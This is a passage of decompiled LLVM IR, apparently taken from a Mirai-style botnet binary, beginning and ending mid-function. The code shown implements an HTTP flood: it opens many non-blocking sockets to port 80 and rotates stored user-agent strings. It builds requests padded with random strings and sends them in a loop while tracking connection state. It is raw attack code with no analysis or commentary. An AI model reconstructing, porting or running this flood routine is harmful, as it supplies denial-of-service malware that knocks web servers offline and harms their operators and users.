  %v1_bd04 = add i32 %v2_bd00, %v3_bc04
  %v1_bd08 = inttoptr i32 %v1_bd04 to i8*
  %v6_bd10 = call i32 @util_strcpy(i8* %v1_bd08, i8* nonnull %v14_bb24)
  %v1_bd5c = add i32 %v2_bcc8, 20
  %v2_bd5c = inttoptr i32 %v1_bd5c to i8*
  %v3_bd5c = load i8, i8* %v2_bd5c, align 1
  %tmp = icmp ugt i8 %v3_bd5c, 31
  br i1 %tmp, label %dec_label_pc_be5c, label %dec_label_pc_bd68

dec_label_pc_bd68:                                ; preds = %dec_label_pc_bbe4
  store i32 %v2_bc10, i32* @r4, align 4
  %v3_bde0 = load i32, i32* %v2_bccc, align 4
  %v1_bde8 = call i32 @__GI_ntohl(i32 %v3_bde0)
  store i32 %v1_bde8, i32* @r5, align 4
  %v0_bdf0 = call i32 @rand_next()
  store i32 %v0_bdf0, i32* @r6, align 4
  %v3_be40 = load i8, i8* %v2_bd5c, align 1
  %v4_be40 = zext i8 %v3_be40 to i32
  %v6_be44 = lshr i32 %v0_bdf0, %v4_be40
  %v0_be48 = load i32, i32* @r5, align 4
  %v2_be48 = add i32 %v0_be48, %v6_be44
  %v1_be50 = call i32 @__GI_htonl(i32 %v2_be48)
  %v1_be58 = load i32, i32* @r4, align 4
  %v2_be58 = add i32 %v1_be58, 16
  %v3_be58 = inttoptr i32 %v2_be58 to i32*
  store i32 %v1_be50, i32* %v3_be58, align 4
  br label %dec_label_pc_be5c

dec_label_pc_be5c:                                ; preds = %dec_label_pc_bbe4, %dec_label_pc_bd68
  %v0_be5c = call i32 @rand_next()
  %v3_be6c = udiv i32 %v0_be5c, 5
  %v2_be90 = sub i32 %v0_be5c, %v3_be6c
  store i32 %v2_be90, i32* @lr, align 4
  switch i32 %v2_be90, label %dec_label_pc_c0b4 [
    i32 0, label %dec_label_pc_bec4
    i32 1, label %dec_label_pc_bf28
    i32 2, label %dec_label_pc_bf8c
    i32 3, label %dec_label_pc_bff0
    i32 4, label %dec_label_pc_c054
  ]

dec_label_pc_bec4:                                ; preds = %dec_label_pc_be5c
  call void @table_unlock_val(i8 47)
  %v1_befc = add i32 %v2_bc10, 20
  store i32 %v1_befc, i32* @r4, align 4
  %v3_bf08 = call i8* @table_retrieve_val(i32 47, i32* null)
  %v0_bf10 = load i32, i32* @r4, align 4
  %v1_bf10 = inttoptr i32 %v0_bf10 to i8*
  %v6_bf18 = call i32 @util_strcpy(i8* %v1_bf10, i8* %v3_bf08)
  call void @table_lock_val(i8 47)
  br label %dec_label_pc_c0b4

dec_label_pc_bf28:                                ; preds = %dec_label_pc_be5c
  call void @table_unlock_val(i8 48)
  %v1_bf60 = add i32 %v2_bc10, 20
  store i32 %v1_bf60, i32* @r4, align 4
  %v3_bf6c = call i8* @table_retrieve_val(i32 48, i32* null)
  %v0_bf74 = load i32, i32* @r4, align 4
  %v1_bf74 = inttoptr i32 %v0_bf74 to i8*
  %v6_bf7c = call i32 @util_strcpy(i8* %v1_bf74, i8* %v3_bf6c)
  call void @table_lock_val(i8 48)
  br label %dec_label_pc_c0b4

dec_label_pc_bf8c:                                ; preds = %dec_label_pc_be5c
  call void @table_unlock_val(i8 49)
  %v1_bfc4 = add i32 %v2_bc10, 20
  store i32 %v1_bfc4, i32* @r4, align 4
  %v3_bfd0 = call i8* @table_retrieve_val(i32 49, i32* null)
  %v0_bfd8 = load i32, i32* @r4, align 4
  %v1_bfd8 = inttoptr i32 %v0_bfd8 to i8*
  %v6_bfe0 = call i32 @util_strcpy(i8* %v1_bfd8, i8* %v3_bfd0)
  call void @table_lock_val(i8 49)
  br label %dec_label_pc_c0b4

dec_label_pc_bff0:                                ; preds = %dec_label_pc_be5c
  call void @table_unlock_val(i8 50)
  %v1_c028 = add i32 %v2_bc10, 20
  store i32 %v1_c028, i32* @r4, align 4
  %v3_c034 = call i8* @table_retrieve_val(i32 50, i32* null)
  %v0_c03c = load i32, i32* @r4, align 4
  %v1_c03c = inttoptr i32 %v0_c03c to i8*
  %v6_c044 = call i32 @util_strcpy(i8* %v1_c03c, i8* %v3_c034)
  call void @table_lock_val(i8 50)
  br label %dec_label_pc_c0b4

dec_label_pc_c054:                                ; preds = %dec_label_pc_be5c
  call void @table_unlock_val(i8 51)
  %v1_c08c = add i32 %v2_bc10, 20
  store i32 %v1_c08c, i32* @r4, align 4
  %v3_c098 = call i8* @table_retrieve_val(i32 51, i32* null)
  %v0_c0a0 = load i32, i32* @r4, align 4
  %v1_c0a0 = inttoptr i32 %v0_c0a0 to i8*
  %v6_c0a8 = call i32 @util_strcpy(i8* %v1_c0a0, i8* %v3_c098)
  call void @table_lock_val(i8 51)
  br label %dec_label_pc_c0b4

dec_label_pc_c0b4:                                ; preds = %dec_label_pc_be5c, %dec_label_pc_bff0, %dec_label_pc_bf8c, %dec_label_pc_bf28, %dec_label_pc_bec4, %dec_label_pc_c054
  %v1_c0b8 = add nuw nsw i32 %storemerge12109, 1
  %v5_c0cc = icmp slt i32 %v1_c0b8, %mfd_-72.0
  br i1 %v5_c0cc, label %dec_label_pc_bbe4, label %dec_label_pc_c0d0.preheader

dec_label_pc_c0d0.preheader:                      ; preds = %dec_label_pc_c0b4, %dec_label_pc_bbc0
  %v2_c0f0 = ptrtoint %anon_struct_0** %__arr_-10504 to i32
  %v2_c134 = ptrtoint %anon_struct_0** %__arr_-10632 to i32
  %v3_c1e8 = ptrtoint i32* %addr_-10364 to i32
  %v2_c2b0 = ptrtoint i32* %i_-96 to i32
  %v2_c4f8 = ptrtoint [10240 x i8]* %buf_-20872 to i32
  %tmp75 = getelementptr inbounds [10240 x i8], [10240 x i8]* %buf_-20872, i32 0, i32 0
  %v2_ccbc = ptrtoint i32* %szbuf_-10368 to i32
  %tmp76 = bitcast i32* %szbuf_-10368 to i8*
  %v3_cfe8 = ptrtoint %timeval.12* %tim_-10348 to i32
  %v5_d008 = getelementptr inbounds %timeval.12, %timeval.12* %tim_-10348, i32 0, i32 0
  %v2_d14c = ptrtoint i32* %sent_-10372 to i32
  %v2_d158 = ptrtoint %anon_struct_0** %__arr_-10376 to i32
  br label %dec_label_pc_c104.lr.ph

dec_label_pc_c104.lr.ph:                          ; preds = %dec_label_pc_cfd8, %dec_label_pc_cfcc, %dec_label_pc_d24c, %dec_label_pc_d258.preheader, %dec_label_pc_c0d0.preheader
  %v2_c0dc = call i32 @__GI_time(i32* null)
  br label %dec_label_pc_c104

dec_label_pc_c104:                                ; preds = %dec_label_pc_c104.lr.ph, %dec_label_pc_c104
  %storemerge1319 = phi i32 [ 0, %dec_label_pc_c104.lr.ph ], [ %v1_c118, %dec_label_pc_c104 ]
  %v5_c110 = mul i32 %storemerge1319, 4
  %v6_c110 = add i32 %v5_c110, %v2_c0f0
  %v7_c110 = inttoptr i32 %v6_c110 to i32*
  store i32 0, i32* %v7_c110, align 4
  %v1_c118 = add i32 %storemerge1319, 1
  %tmp111 = icmp ult i32 %v1_c118, 32
  br i1 %tmp111, label %dec_label_pc_c104, label %dec_label_pc_c148.lr.ph

dec_label_pc_c148.lr.ph:                          ; preds = %dec_label_pc_c104
  br label %dec_label_pc_c148

dec_label_pc_c148:                                ; preds = %dec_label_pc_c148.lr.ph, %dec_label_pc_c148
  %v4_c16480 = phi i32 [ 0, %dec_label_pc_c148.lr.ph ], [ %v1_c15c, %dec_label_pc_c148 ]
  %v5_c154 = mul i32 %v4_c16480, 4
  %v6_c154 = add i32 %v5_c154, %v2_c134
  %v7_c154 = inttoptr i32 %v6_c154 to i32*
  store i32 0, i32* %v7_c154, align 4
  %v1_c15c = add i32 %v4_c16480, 1
  %v4_c160 = inttoptr i32 %v1_c15c to %anon_struct_0*
  %v7_c168 = icmp eq %anon_struct_0* %v4_c160, inttoptr (i32 31 to %anon_struct_0*)
  %v2_c16c = icmp ule %anon_struct_0* %v4_c160, inttoptr (i32 30 to %anon_struct_0*)
  %v3_c16c = or i1 %v7_c168, %v2_c16c
  br i1 %v3_c16c, label %dec_label_pc_c148, label %dec_label_pc_cfbc.preheader

dec_label_pc_cfbc.preheader:                      ; preds = %dec_label_pc_c148
  br i1 %v5_c0cc108, label %dec_label_pc_c17c, label %dec_label_pc_cfcc

dec_label_pc_c17c:                                ; preds = %dec_label_pc_cfbc.preheader, %dec_label_pc_cfb0
  %storemerge1491 = phi i32 [ %v1_cfb4, %dec_label_pc_cfb0 ], [ 0, %dec_label_pc_cfbc.preheader ]
  %nfds_-68.190 = phi i32 [ %nfds_-68.0, %dec_label_pc_cfb0 ], [ 0, %dec_label_pc_cfbc.preheader ]
  store i32 %storemerge1491, i32* @r1, align 4
  %v3_c19c = mul i32 %storemerge1491, 668
  %v2_c1a8 = add i32 %v3_c19c, %v2_bbcc
  %v1_c1b4 = add i32 %v2_c1a8, 4
  %v2_c1b4 = inttoptr i32 %v1_c1b4 to i8*
  %v3_c1b4 = load i8, i8* %v2_c1b4, align 1
  %v7_c1b8 = icmp eq i8 %v3_c1b4, 1
  br i1 %v7_c1b8, label %dec_label_pc_c1c0, label %dec_label_pc_c1cc

dec_label_pc_c1c0:                                ; preds = %dec_label_pc_c17c
  store i8 0, i8* %v2_c1b4, align 1
  br label %dec_label_pc_c1cc

dec_label_pc_c1cc:                                ; preds = %dec_label_pc_c17c, %dec_label_pc_c1c0
  %v3_c1d0 = load i8, i8* %v2_c1b4, align 1
  %v2_c1d4 = icmp eq i8 %v3_c1d0, 0
  br i1 %v2_c1d4, label %dec_label_pc_c1dc, label %dec_label_pc_c3fc

dec_label_pc_c1dc:                                ; preds = %dec_label_pc_c1cc
  store i32 %v2_baa4, i32* @r1, align 4
  store i32 0, i32* %addr_-10364, align 4
  %v1_c21c = inttoptr i32 %v2_c1a8 to i32*
  %v2_c21c = load i32, i32* %v1_c21c, align 4
  %v7_c220 = icmp eq i32 %v2_c21c, -1
  br i1 %v7_c220, label %dec_label_pc_c238, label %dec_label_pc_c228

dec_label_pc_c228:                                ; preds = %dec_label_pc_c1dc
  %v2_c22c = load i32, i32* %v1_c21c, align 4
  %v1_c234 = call i32 @__GI___libc_close(i32 %v2_c22c)
  br label %dec_label_pc_c238

dec_label_pc_c238:                                ; preds = %dec_label_pc_c1dc, %dec_label_pc_c228
  %v3_c244 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_c244, i32* %v1_c21c, align 4
  %v7_c25c = icmp eq i32 %v3_c244, -1
  br i1 %v7_c25c, label %dec_label_pc_cfb0, label %dec_label_pc_c264

dec_label_pc_c264:                                ; preds = %dec_label_pc_c238
  %v2_c268 = load i32, i32* %v1_c21c, align 4
  store i32 %v2_c268, i32* @r4, align 4
  %v2_c270 = load i32, i32* %v1_c21c, align 4
  store i32 %v2_c270, i32* @r3, align 4
  store i32 0, i32* @r2, align 4
  %v2_c280 = call i32 @__libc_fcntl(i32 %v2_c270, i32 3)
  %v1_c288 = or i32 %v2_c280, 2048
  store i32 %v1_c288, i32* @r3, align 4
  %v0_c28c = load i32, i32* @r4, align 4
  store i32 %v1_c288, i32* @r2, align 4
  %v2_c298 = call i32 @__libc_fcntl(i32 %v0_c28c, i32 4)
  store i32 65535, i32* %i_-96, align 4
  %v2_c2ac = load i32, i32* %v1_c21c, align 4
  %v5_c2cc = call i32 @__GI_setsockopt(i32 %v2_c2ac, i32 0, i32 8, i32 %v2_c2b0, i32 4)
  store i32 2, i32* %addr_-10364, align 4
  %v1_c30c = call i32 @__GI_htons(i32 80)
  %v2_c33c = add i32 %v2_c1a8, 8
  %v3_c33c = inttoptr i32 %v2_c33c to i32*
  store i32 %v2_c0dc, i32* %v3_c33c, align 4
  store i8 2, i8* %v2_c1b4, align 1
  %v2_c350 = load i32, i32* %v1_c21c, align 4
  %v3_c36c = call i32 @__libc_connect(i32 %v2_c350, i32 %v3_c1e8, i32 16)
  %v2_c374 = load i32, i32* %v1_c21c, align 4
  %v3_c378 = udiv i32 %v2_c374, 32
  %v3_c38c = mul nuw nsw i32 %v3_c378, 4
  %v2_c394 = add i32 %v3_c38c, %v2_baa4
  %v2_c398 = add i32 %v2_c394, -10600
  %v1_c39c = inttoptr i32 %v2_c398 to i32*
  %v2_c39c = load i32, i32* %v1_c39c, align 4
  %v2_c3a4 = load i32, i32* %v1_c21c, align 4
  %v1_c3a8 = urem i32 %v2_c3a4, 32
  %v6_c3b0 = shl i32 1, %v1_c3a8
  %v2_c3b4 = or i32 %v6_c3b0, %v2_c39c
  store i32 %v2_baa4, i32* @lr, align 4
  store i32 %v2_c3b4, i32* %v1_c39c, align 4
  %v2_c3d8 = load i32, i32* %v1_c21c, align 4
  %v2_c3e0 = sub i32 %v2_c3d8, %nfds_-68.190
  %v4_c3e0 = xor i32 %v2_c3d8, %nfds_-68.190
  %v5_c3e0 = xor i32 %v2_c3e0, %v2_c3d8
  %v6_c3e0 = and i32 %v5_c3e0, %v4_c3e0
  %v7_c3e0 = icmp slt i32 %v6_c3e0, 0
  %v8_c3e0 = icmp slt i32 %v2_c3e0, 0
  %v9_c3e0 = icmp eq i32 %v2_c3d8, %nfds_-68.190
  %v3_c3e4 = xor i1 %v8_c3e0, %v7_c3e0
  %v4_c3e4 = or i1 %v9_c3e0, %v3_c3e4
  br i1 %v4_c3e4, label %dec_label_pc_cfb0, label %dec_label_pc_c3e8

dec_label_pc_c3e8:                                ; preds = %dec_label_pc_c264
  %v2_c3ec = load i32, i32* %v1_c21c, align 4
  %v1_c3f0 = add i32 %v2_c3ec, 1
  br label %dec_label_pc_cfb0

dec_label_pc_c3fc:                                ; preds = %dec_label_pc_c1cc
  %v3_c400 = load i8, i8* %v2_c1b4, align 1
  %v7_c404 = icmp eq i8 %v3_c400, 2
  br i1 %v7_c404, label %dec_label_pc_c40c, label %dec_label_pc_c4e0

dec_label_pc_c40c:                                ; preds = %dec_label_pc_c3fc
  %v1_c410 = add i32 %v2_c1a8, 8
  %v2_c410 = inttoptr i32 %v1_c410 to i32*
  %v3_c410 = load i32, i32* %v2_c410, align 4
  %v2_c41c = sub i32 %v2_c0dc, %v3_c410
  %tmp112 = icmp ult i32 %v2_c41c, 31
  br i1 %tmp112, label %dec_label_pc_c454, label %dec_label_pc_c428

dec_label_pc_c428:                                ; preds = %dec_label_pc_c40c
  store i8 0, i8* %v2_c1b4, align 1
  %v1_c438 = inttoptr i32 %v2_c1a8 to i32*
  %v2_c438 = load i32, i32* %v1_c438, align 4
  %v1_c440 = call i32 @__GI___libc_close(i32 %v2_c438)
  store i32 -1, i32* %v1_c438, align 4
  br label %dec_label_pc_cfb0

dec_label_pc_c454:                                ; preds = %dec_label_pc_c40c
  %v1_c458 = inttoptr i32 %v2_c1a8 to i32*
  %v2_c458 = load i32, i32* %v1_c458, align 4
  %v3_c45c = udiv i32 %v2_c458, 32
  %v3_c470 = mul nuw nsw i32 %v3_c45c, 4
  %v2_c478 = add i32 %v3_c470, %v2_baa4
  %v2_c47c = add i32 %v2_c478, -10600
  %v1_c480 = inttoptr i32 %v2_c47c to i32*
  %v2_c480 = load i32, i32* %v1_c480, align 4
  %v2_c488 = load i32, i32* %v1_c458, align 4
  %v1_c48c = urem i32 %v2_c488, 32
  %v6_c494 = shl i32 1, %v1_c48c
  %v2_c498 = or i32 %v6_c494, %v2_c480
  store i32 %v2_baa4, i32* @lr, align 4
  store i32 %v2_c498, i32* %v1_c480, align 4
  %v2_c4bc = load i32, i32* %v1_c458, align 4
  %v2_c4c4 = sub i32 %v2_c4bc, %nfds_-68.190
  %v4_c4c4 = xor i32 %v2_c4bc, %nfds_-68.190
  %v5_c4c4 = xor i32 %v2_c4c4, %v2_c4bc
  %v6_c4c4 = and i32 %v5_c4c4, %v4_c4c4
  %v7_c4c4 = icmp slt i32 %v6_c4c4, 0
  %v8_c4c4 = icmp slt i32 %v2_c4c4, 0
  %v9_c4c4 = icmp eq i32 %v2_c4bc, %nfds_-68.190
  %v3_c4c8 = xor i1 %v8_c4c4, %v7_c4c4
  %v4_c4c8 = or i1 %v9_c4c4, %v3_c4c8
  br i1 %v4_c4c8, label %dec_label_pc_cfb0, label %dec_label_pc_c4cc

dec_label_pc_c4cc:                                ; preds = %dec_label_pc_c454
  %v2_c4d0 = load i32, i32* %v1_c458, align 4
  %v1_c4d4 = add i32 %v2_c4d0, 1
  br label %dec_label_pc_cfb0

dec_label_pc_c4e0:                                ; preds = %dec_label_pc_c3fc
  %v3_c4e4 = load i8, i8* %v2_c1b4, align 1
  %v7_c4e8 = icmp eq i8 %v3_c4e4, 5
  br i1 %v7_c4e8, label %dec_label_pc_c4f0, label %dec_label_pc_cb74

dec_label_pc_c4f0:                                ; preds = %dec_label_pc_c4e0
  call void @util_zero(i8* %tmp75, i32 10240)
  %v3_c518 = call i32 @util_strlen(i8* %tmp75)
  %v2_c530 = add i32 %v3_c518, %v2_c4f8
  %v1_c534 = inttoptr i32 %v2_c530 to i8*
  %v6_c53c = call i32 @util_strcpy(i8* %v1_c534, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @global_var_22e38.66, i32 0, i32 0))
  %v3_c550 = call i32 @util_strlen(i8* %tmp75)
  %v2_c568 = add i32 %v3_c550, %v2_c4f8
  %v1_c56c = inttoptr i32 %v2_c568 to i8*
  call void @rand_alphastr(i8* %v1_c56c, i32 16)
  %v3_c588 = call i32 @util_strlen(i8* %tmp75)
  %v2_c5a0 = add i32 %v3_c588, %v2_c4f8
  %v1_c5a4 = inttoptr i32 %v2_c5a0 to i8*
  %v6_c5ac = call i32 @util_strcpy(i8* %v1_c5a4, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @global_var_22dd4.37, i32 0, i32 0))
  %v3_c5c0 = call i32 @util_strlen(i8* %tmp75)
  %v2_c5d8 = add i32 %v3_c5c0, %v2_c4f8
  %v1_c5e0 = add i32 %v2_c1a8, 20
  %v1_c5e4 = inttoptr i32 %v2_c5d8 to i8*
  %v1_c5e8 = inttoptr i32 %v1_c5e0 to i8*
  %v6_c5ec = call i32 @util_strcpy(i8* %v1_c5e4, i8* %v1_c5e8)
  %v3_c600 = call i32 @util_strlen(i8* %tmp75)
  %v2_c618 = add i32 %v3_c600, %v2_c4f8
  %v1_c61c = inttoptr i32 %v2_c618 to i8*
  %v6_c624 = call i32 @util_strcpy(i8* %v1_c61c, i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_22dec.39, i32 0, i32 0))
  %v3_c638 = call i32 @util_strlen(i8* %tmp75)
  %v2_c650 = add i32 %v3_c638, %v2_c4f8
  %v1_c658 = add i32 %v2_c1a8, 532
  %v1_c65c = inttoptr i32 %v2_c650 to i8*
  %v1_c660 = inttoptr i32 %v1_c658 to i8*
  %v6_c664 = call i32 @util_strcpy(i8* %v1_c65c, i8* %v1_c660)
  %v3_c678 = call i32 @util_strlen(i8* %tmp75)
  %v2_c690 = add i32 %v3_c678, %v2_c4f8
  %v1_c694 = inttoptr i32 %v2_c690 to i8*
  %v6_c69c = call i32 @util_strcpy(i8* %v1_c694, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0))
  call void @table_unlock_val(i8 32)
  %v3_c6b8 = call i32 @util_strlen(i8* %tmp75)
  %v2_c6cc = add i32 %v3_c6b8, %v2_c4f8
  %v3_c6d8 = call i8* @table_retrieve_val(i32 32, i32* null)
  %v1_c6e0 = inttoptr i32 %v2_c6cc to i8*
  %v6_c6e8 = call i32 @util_strcpy(i8* %v1_c6e0, i8* %v3_c6d8)
  call void @table_lock_val(i8 32)
  %v3_c704 = call i32 @util_strlen(i8* %tmp75)
  %v2_c71c = add i32 %v3_c704, %v2_c4f8
  %v1_c720 = inttoptr i32 %v2_c71c to i8*
  %v6_c728 = call i32 @util_strcpy(i8* %v1_c720, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0))
  call void @table_unlock_val(i8 33)
  %v3_c744 = call i32 @util_strlen(i8* %tmp75)
  %v2_c758 = add i32 %v3_c744, %v2_c4f8
  %v3_c764 = call i8* @table_retrieve_val(i32 33, i32* null)
  %v1_c76c = inttoptr i32 %v2_c758 to i8*
  %v6_c774 = call i32 @util_strcpy(i8* %v1_c76c, i8* %v3_c764)
  call void @table_lock_val(i8 33)
  %v3_c790 = call i32 @util_strlen(i8* %tmp75)
  %v2_c7a8 = add i32 %v3_c790, %v2_c4f8
  %v1_c7ac = inttoptr i32 %v2_c7a8 to i8*
  %v6_c7b4 = call i32 @util_strcpy(i8* %v1_c7ac, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0))
  call void @table_unlock_val(i8 34)
  %v3_c7d0 = call i32 @util_strlen(i8* %tmp75)
  %v2_c7e4 = add i32 %v3_c7d0, %v2_c4f8
  %v3_c7f0 = call i8* @table_retrieve_val(i32 34, i32* null)
  %v1_c7f8 = inttoptr i32 %v2_c7e4 to i8*
  %v6_c800 = call i32 @util_strcpy(i8* %v1_c7f8, i8* %v3_c7f0)
  call void @table_lock_val(i8 34)
  %v3_c81c = call i32 @util_strlen(i8* %tmp75)
  %v2_c834 = add i32 %v3_c81c, %v2_c4f8
  %v1_c838 = inttoptr i32 %v2_c834 to i8*
  %v6_c840 = call i32 @util_strcpy(i8* %v1_c838, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0))
  call void @table_unlock_val(i8 35)
  %v3_c85c = call i32 @util_strlen(i8* %tmp75)
  %v2_c870 = add i32 %v3_c85c, %v2_c4f8
  %v3_c87c = call i8* @table_retrieve_val(i32 35, i32* null)
  %v1_c884 = inttoptr i32 %v2_c870 to i8*
  %v6_c88c = call i32 @util_strcpy(i8* %v1_c884, i8* %v3_c87c)
  call void @table_lock_val(i8 35)
  %v3_c8a8 = call i32 @util_strlen(i8* %tmp75)
  %v2_c8c0 = add i32 %v3_c8a8, %v2_c4f8
  %v1_c8c4 = inttoptr i32 %v2_c8c0 to i8*
  %v6_c8cc = call i32 @util_strcpy(i8* %v1_c8c4, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0))
  call void @table_unlock_val(i8 41)
  %v3_c8e8 = call i32 @util_strlen(i8* %tmp75)
  %v2_c8fc = add i32 %v3_c8e8, %v2_c4f8
  %v3_c908 = call i8* @table_retrieve_val(i32 41, i32* null)
  %v1_c910 = inttoptr i32 %v2_c8fc to i8*
  %v6_c918 = call i32 @util_strcpy(i8* %v1_c910, i8* %v3_c908)
  call void @table_lock_val(i8 41)
  %v3_c934 = call i32 @util_strlen(i8* %tmp75)
  %v2_c94c = add i32 %v3_c934, %v2_c4f8
  %v1_c950 = inttoptr i32 %v2_c94c to i8*
  %v6_c958 = call i32 @util_strcpy(i8* %v1_c950, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @global_var_22dd0.35, i32 0, i32 0))
  call void @table_unlock_val(i8 42)
  %v3_c974 = call i32 @util_strlen(i8* %tmp75)
  %v2_c988 = add i32 %v3_c974, %v2_c4f8
  %v3_c994 = call i8* @table_retrieve_val(i32 42, i32* null)
  %v1_c99c = inttoptr i32 %v2_c988 to i8*
  %v6_c9a4 = call i32 @util_strcpy(i8* %v1_c99c, i8* %v3_c994)
  call void @table_lock_val(i8 42)
  %v3_c9c0 = call i32 @util_strlen(i8* %tmp75)
  %v2_c9d8 = add i32 %v3_c9c0, %v2_c4f8
  %v1_c9dc = inttoptr i32 %v2_c9d8 to i8*
  %v6_c9e4 = call i32 @util_strcpy(i8* %v1_c9dc, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0))
  %v3_c9f8 = call i32 @util_strlen(i8* %tmp75)
  %v2_ca10 = add i32 %v3_c9f8, %v2_c4f8
  %v1_ca14 = inttoptr i32 %v2_ca10 to i8*
  %v6_ca1c = call i32 @util_strcpy(i8* %v1_ca14, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_22df8.41, i32 0, i32 0))
  %v2_ca28 = add i32 %v2_c1a8, 664
  %v3_ca28 = inttoptr i32 %v2_ca28 to i32*
  store i32 83886080, i32* %v3_ca28, align 4
  %v1_ca30 = inttoptr i32 %v2_c1a8 to i32*
  %v2_ca30 = load i32, i32* %v1_ca30, align 4
  store i32 %v2_ca30, i32* @r4, align 4
  %v3_ca44 = call i32 @util_strlen(i8* %tmp75)
  %v0_ca5c = load i32, i32* @r4, align 4
  %v4_ca68 = call i32 @__libc_send(i32 %v0_ca5c, i32 %v2_c4f8, i32 %v3_ca44, i32 16384)
  %v2_ca74 = add i32 %v2_c1a8, 12
  %v3_ca74 = inttoptr i32 %v2_ca74 to i32*
  store i32 %v2_c0dc, i32* %v3_ca74, align 4
  store i8 8, i8* %v2_c1b4, align 1
  %v2_ca88 = load i32, i32* %v1_ca30, align 4
  %v3_ca8c = udiv i32 %v2_ca88, 32
  %v3_caa0 = mul nuw nsw i32 %v3_ca8c, 4
  %v2_caa8 = add i32 %v3_caa0, %v2_baa4
  %v2_caac = add i32 %v2_caa8, -10600
  %v1_cab0 = inttoptr i32 %v2_caac to i32*
  %v2_cab0 = load i32, i32* %v1_cab0, align 4
  %v2_cab8 = load i32, i32* %v1_ca30, align 4
  %v1_cabc = urem i32 %v2_cab8, 32
  %v6_cac4 = shl i32 1, %v1_cabc
  %v2_cac8 = or i32 %v6_cac4, %v2_cab0
  store i32 %v2_cac8, i32* %v1_cab0, align 4
  %v2_caec = load i32, i32* %v1_ca30, align 4
  %v3_caf0 = udiv i32 %v2_caec, 32
  %v3_cb04 = mul nuw nsw i32 %v3_caf0, 4
  %v2_cb0c = add i32 %v3_cb04, %v2_baa4
  %v2_cb10 = add i32 %v2_cb0c, -10472
  %v1_cb14 = inttoptr i32 %v2_cb10 to i32*
  %v2_cb14 = load i32, i32* %v1_cb14, align 4
  %v2_cb1c = load i32, i32* %v1_ca30, align 4
  %v1_cb20 = urem i32 %v2_cb1c, 32
  %v6_cb28 = shl i32 1, %v1_cb20
  %v2_cb2c = or i32 %v6_cb28, %v2_cb14
  store i32 %v2_baa4, i32* @lr, align 4
  store i32 %v2_cb2c, i32* %v1_cb14, align 4
  %v2_cb50 = load i32, i32* %v1_ca30, align 4
  %v2_cb58 = sub i32 %v2_cb50, %nfds_-68.190
  %v4_cb58 = xor i32 %v2_cb50, %nfds_-68.190
  %v5_cb58 = xor i32 %v2_cb58, %v2_cb50
  %v6_cb58 = and i32 %v5_cb58, %v4_cb58
  %v7_cb58 = icmp slt i32 %v6_cb58, 0
  %v8_cb58 = icmp slt i32 %v2_cb58, 0
  %v9_cb58 = icmp eq i32 %v2_cb50, %nfds_-68.190
  %v3_cb5c = xor i1 %v8_cb58, %v7_cb58
  %v4_cb5c = or i1 %v9_cb58, %v3_cb5c
  br i1 %v4_cb5c, label %dec_label_pc_cfb0, label %dec_label_pc_cb60

dec_label_pc_cb60:                                ; preds = %dec_label_pc_c4f0
  %v2_cb64 = load i32, i32* %v1_ca30, align 4
  %v1_cb68 = add i32 %v2_cb64, 1
  br label %dec_label_pc_cfb0

dec_label_pc_cb74:                                ; preds = %dec_label_pc_c4e0
  %v3_cb78 = load i8, i8* %v2_c1b4, align 1
  %v7_cb7c = icmp eq i8 %v3_cb78, 8
  br i1 %v7_cb7c, label %dec_label_pc_cb84, label %dec_label_pc_ceec

dec_label_pc_cb84:                                ; preds = %dec_label_pc_cb74
  %v4_cbb0 = call i32 @__GI_memset(i8* %tmp75, i32 0, i32 1025)
  call void @util_zero(i8* %tmp75, i32 1025)
  call void @rand_alphastr(i8* %tmp75, i32 1024)
  %v1_cbec = add i32 %v2_c1a8, 664
  %v2_cbec = inttoptr i32 %v1_cbec to i32*
  %v3_cbec = load i32, i32* %v2_cbec, align 4
  %v5_cbf4 = icmp sgt i32 %v3_cbec, 0
  br i1 %v5_cbf4, label %dec_label_pc_cc34, label %dec_label_pc_cbf8

dec_label_pc_cbf8:                                ; preds = %dec_label_pc_cb84
  %v1_cbfc = inttoptr i32 %v2_c1a8 to i32*
  %v2_cbfc = load i32, i32* %v1_cbfc, align 4
  %v5_cc10 = call i32 @__libc_send(i32 %v2_cbfc, i32 ptrtoint ([4 x i8]* @global_var_22e48.72 to i32), i32 3, i32 16384)
  br label %dec_label_pc_ce54

dec_label_pc_cc34:                                ; preds = %dec_label_pc_cb84
  %v3_cc38 = load i32, i32* %v2_cbec, align 4
  %v2_cc44 = add i32 %v3_cc38, -1023
  %tmp77 = sub i32 1022, %v3_cc38
  %v6_cc44 = and i32 %tmp77, %v3_cc38
  %v7_cc44 = icmp slt i32 %v6_cc44, 0
  %v8_cc44 = icmp slt i32 %v2_cc44, 0
  %v9_cc44 = icmp eq i32 %v3_cc38, 1023
  %v3_cc48 = xor i1 %v8_cc44, %v7_cc44
  %v4_cc48 = or i1 %v9_cc44, %v3_cc48
  br i1 %v4_cc48, label %dec_label_pc_cc4c, label %dec_label_pc_cc70

dec_label_pc_cc4c:                                ; preds = %dec_label_pc_cc34
  %v3_cc50 = load i32, i32* %v2_cbec, align 4
  %v2_cc64 = add i32 %v3_cc50, %v2_c4f8
  %v3_cc6c = inttoptr i32 %v2_cc64 to i8*
  store i8 0, i8* %v3_cc6c, align 1
  br label %dec_label_pc_cc70

dec_label_pc_cc70:                                ; preds = %dec_label_pc_cc34, %dec_label_pc_cc4c
  %v3_cc74 = load i32, i32* %v2_cbec, align 4
  %v2_cc80 = add i32 %v3_cc74, -1023
  %tmp78 = sub i32 1022, %v3_cc74
  %v6_cc80 = and i32 %tmp78, %v3_cc74
  %v7_cc80 = icmp slt i32 %v6_cc80, 0
  %v8_cc80 = icmp slt i32 %v2_cc80, 0
  %v9_cc80 = icmp eq i32 %v3_cc74, 1023
  %v3_cc84 = xor i1 %v8_cc80, %v7_cc80
